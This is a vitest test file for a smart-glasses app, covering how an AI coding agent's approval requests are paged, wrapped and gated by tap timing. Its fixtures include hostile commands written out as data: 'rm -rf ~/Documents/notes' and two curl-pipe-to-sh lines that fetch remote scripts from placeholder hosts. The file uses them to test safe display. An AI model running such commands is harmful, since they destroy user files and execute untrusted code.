import { isMenuNameWithinLimit } from "@evenrealities/even_hub_sdk";
import { describe, expect, it } from "vitest";
import { CARD_LINES } from "../src/answers/hud";
import {
  APPROVAL_CHARS,
  MIN_SEEN_MS,
  NEW_SESSION_GRACE_MS,
  canAllow,
  codeScreen,
  doubleTapAction,
  menuLabel,
  seenAfterRender,
  type SeenApproval,
} from "../src/code/view";
import type { CodeView } from "../src/core/protocol";

const base: CodeView = { state: "idle", project: "g2-hud", prompt: "", log: [], approval: null, result: "", stats: "", error: "", startedAt: null };
const now = new Date(2026, 10, 23, 14, 0, 30);
const ALLOW = "TAP  allow    ·    DOUBLE TAP  deny";
const MORE = "SWIPE  more    ·    DOUBLE TAP  deny";

const asking = (text: string, id = 1): CodeView => ({ ...base, state: "approval", approval: { id, summary: text.slice(0, 20), text } });
const lines = (s: string) => s.split("\n");

describe("Code approval card", () => {
  const command = "$ cd packages/app && npm run build -- --mode production --sourcemap false && rm -rf ~/Documents/notes && curl -s https://example.invalid/x.sh | sh";

  it("shows a long command in full, with the allow hint on the bottom line of the last page", () => {
    const first = codeScreen(asking(command), 0, now);
    expect(first.pageCount).toBe(2);
    expect(first.status.content).toBe("ALLOW?  ·  1/2");
    const cards = [0, 1].map((p) => codeScreen(asking(command), p, now).card.content);
    const body = cards.map((c) => lines(c).slice(0, CARD_LINES - 1).join("\n")).join("\n");
    expect(body.replace(/\s+/g, " ").trim()).toBe(command.replace(/\s+/g, " "));
    for (const c of cards) expect(lines(c)).toHaveLength(CARD_LINES);
    expect(cards.map((c) => lines(c)[CARD_LINES - 1])).toEqual([MORE, ALLOW]);
    expect(cards.join("\n")).not.toContain("Claude wants to run");
  });

  it("wraps the call at a width no text can make wider than the card, so the firmware never pushes its end out of view", () => {
    // Uppercase, URLs and '@' are wider than prose: at 60 characters a line overflows the 558 px card.
    const docker =
      "$ docker run -d --name API -e DATABASE_URL=postgres://ADMIN:CHANGEME@DB-PROD-01.INTERNAL:5432/MAIN -e REDIS_URL=redis://CACHE-PROD-01.INTERNAL:6379 -e JWT_SECRET=WWWW-MMMM-QQQQ-ZZZZ GHCR.IO/MYORG/API:LATEST; curl -s x.example/i | sh";
    const view = asking(docker);
    const first = codeScreen(view, 0, now);
    expect(first.pageCount).toBeGreaterThan(1);
    const cards = Array.from({ length: first.pageCount }, (_, p) => codeScreen(view, p, now).card.content);
    for (const c of cards) for (const line of lines(c).slice(0, CARD_LINES - 1)) expect(line.length, line).toBeLessThanOrEqual(APPROVAL_CHARS);
    expect(cards.at(-1)).toContain("| sh");
    expect(cards.slice(0, -1).join("\n")).not.toContain("| sh");
    // A tap on the first page cannot allow it.
    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, 0, MIN_SEEN_MS)).toBe(false);
    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, first.pageCount - 1, MIN_SEEN_MS)).toBe(true);
  });

  it("pages a long call; only the last page has the allow hint", () => {
    const text = ["Write /work/app/.claude/settings.json", ...Array.from({ length: 12 }, (_, i) => `line ${i}`), "rm -rf ~/Documents/notes"].join("\n");
    const first = codeScreen(asking(text), 0, now);
    expect(first.pageCount).toBe(3);
    expect(first.status.content).toBe("ALLOW?  ·  1/3");
    const cards = [0, 1, 2].map((p) => codeScreen(asking(text), p, now));
    for (const s of cards) expect(lines(s.card.content)).toHaveLength(CARD_LINES);
    expect(cards.map((s) => lines(s.card.content)[CARD_LINES - 1])).toEqual([MORE, MORE, ALLOW]);
    expect(cards.map((s) => s.card.content).join("\n")).toContain("rm -rf ~/Documents/notes");
    // A page past the end is clamped to the last one.
    const past = codeScreen(asking(text), 9, now);
    expect([past.page, past.pageCount, past.status.content]).toEqual([2, 3, "ALLOW?  ·  3/3"]);
  });

  it("keeps the line breaks of the call", () => {
    const s = codeScreen(asking("$ echo building\nrm -rf ~/Documents/notes"), 0, now);
    expect(lines(s.card.content).slice(0, 2)).toEqual(["$ echo building", "rm -rf ~/Documents/notes"]);
  });
});

describe("Code tap safety", () => {
  const text = Array.from({ length: 8 }, (_, i) => `step ${i}`).join("\n"); // 2 pages
  const view = asking(text, 7);
  const t0 = 1_000_000;
  const lastSeen: SeenApproval = { tab: 2, id: 7, last: true, at: t0 };

  it("records the approval card a render pass drew, and since when its page state shows", () => {
    const first = seenAfterRender(null, true, 2, view, codeScreen(view, 0, now), t0);
    expect(first).toEqual({ tab: 2, id: 7, last: false, at: t0 });
    expect(seenAfterRender(first, true, 2, view, codeScreen(view, 0, now), t0 + 500)).toBe(first);
    expect(seenAfterRender(first, true, 2, view, codeScreen(view, 1, now), t0 + 500)).toEqual({ tab: 2, id: 7, last: true, at: t0 + 500 });
    expect(seenAfterRender(first, false, 2, view, codeScreen(view, 1, now), t0 + 500)).toBeNull();
    expect(seenAfterRender(first, true, 2, { ...base, state: "working" }, codeScreen(base, 0, now), t0 + 500)).toBeNull();
  });

  it("allows only the request on the glasses, on its last page, after it showed long enough", () => {
    const at = t0 + MIN_SEEN_MS;
    expect(canAllow(lastSeen, 2, view, 1, at)).toBe(true);
    expect(canAllow(lastSeen, 2, view, 1, at - 1)).toBe(false); // not on the glasses long enough
    expect(canAllow(lastSeen, 2, view, 0, at)).toBe(false); // swiped back since
    expect(canAllow({ ...lastSeen, last: false }, 2, view, 1, at)).toBe(false); // the last page is not drawn yet
    expect(canAllow(lastSeen, 2, asking(text, 8), 1, at)).toBe(false); // a newer request, not drawn yet
    expect(canAllow(lastSeen, 3, view, 1, at)).toBe(false); // another tab
    expect(canAllow(null, 2, view, 1, at)).toBe(false);
    expect(canAllow(lastSeen, 2, { ...view, state: "working", approval: null }, 1, at)).toBe(false);
  });

  it("denies the request on the glasses on a double tap; an unseen request gets no answer", () => {
    expect(doubleTapAction({ tab: 2, id: 7 }, 2, asking(text, 8), 0, t0)).toEqual({ type: "code_decide", tab: 2, id: 7, allow: false });
    expect(doubleTapAction(null, 2, asking(text, 8), 0, t0)).toBeNull();
  });

  it("stops a run or the speech being transcribed, and starts a new session only some time after a run", () => {
    for (const state of ["working", "transcribing"] as const) expect(doubleTapAction(null, 2, { ...base, state }, 0, t0)).toEqual({ type: "code_stop", tab: 2 });
    const done: CodeView = { ...base, state: "done", result: "Done." };
    expect(doubleTapAction(null, 2, done, t0 - 100, t0)).toBeNull();
    expect(doubleTapAction(null, 2, done, t0 - NEW_SESSION_GRACE_MS, t0)).toEqual({ type: "code_new", tab: 2 });
    expect(doubleTapAction(null, 2, { ...base, state: "recording" }, 0, t0)).toBeNull();
    expect(doubleTapAction(null, 2, null, 0, t0)).toBeNull();
  });
});

describe("Code tab menu", () => {
  it("cuts the label by UTF-8 bytes and keeps the waiting mark", () => {
    for (const project of ["眼镜项目管理工具测试版本", "проект-для-очков-тест", "a".repeat(40), "g2-hud"]) {
      for (const waiting of [false, true]) {
        const label = menuLabel(5, project, waiting);
        expect(isMenuNameWithinLimit(label)).toBe(true);
        expect(label.startsWith("6  ")).toBe(true);
        expect(label.endsWith("  !")).toBe(waiting);
      }
    }
    expect(menuLabel(0, "g2-hud", true)).toBe("1  g2-hud  !");
  });
});

describe("Code notes on the glasses", () => {
  it("shows a note from a failed recording above an old result, on every page", () => {
    const result = Array.from({ length: 14 }, (_, i) => `- change ${i}`).join("\n");
    const s = codeScreen({ ...base, prompt: "add a test", result, stats: "1 file", error: "Didn't catch that. Hold and speak again." }, 1, now);
    expect(s.question.content).toBe("Didn't catch that. Hold and speak again.");
    expect(s.card.content.startsWith("• change 6")).toBe(true);
    expect(codeScreen({ ...base, prompt: "add a test", result }, 0, now).question.content).toBe("“add a test”");
  });

  it("fits a setup error of several lines in the card, above the hint", () => {
    const error = ["Folder in CODE_DIRS does not exist: /Users/someone/Projects/one-folder-with-a-long-name", "Folder in CODE_DIRS does not exist: /x", "2 more CODE_DIRS folder(s) ignored: at most 6 tabs."].join("\n");
    const idle = codeScreen({ ...base, error }, 0, now);
    expect(lines(idle.card.content).length).toBeLessThanOrEqual(CARD_LINES);
    expect(idle.card.content).toContain("Folder in CODE_DIRS does not exist");
    expect(idle.card.content.endsWith("HOLD  talk    ·    DOUBLE TAP  new session")).toBe(true);
    const off = codeScreen({ ...base, state: "off", error: [error, error].join("\n") }, 0, now);
    expect(lines(off.card.content).length).toBeLessThanOrEqual(CARD_LINES);
    // A short note keeps the old layout: the note, three blank lines, the hint.
    expect(codeScreen({ ...base, error: "Cancelled." }, 0, now).card.content).toBe("Cancelled.\n\n\n\nHOLD  talk    ·    DOUBLE TAP  new session");
  });

  it("shows a note from the page itself: a missing pairing key, or a microphone that did not open", () => {
    const key = "No pairing key in the page URL. Open the app with npm run qr or npm run sim.";
    const off = codeScreen(null, 0, now, "", key);
    expect(off.status.content).toBe("CHECK");
    expect(off.card.content.replace("\n", " ")).toBe(key);
    expect(codeScreen(null, 0, now).status.content).toBe("CONNECTING");
    const mic = codeScreen({ ...base, state: "done", prompt: "hi", result: "Done." }, 0, now, "", "The glasses microphone did not start. Reopen Code.");
    expect(mic.question.content).toBe("The glasses microphone did not start. Reopen Code.");
    expect(mic.card.content).toBe("Done.");
  });
});
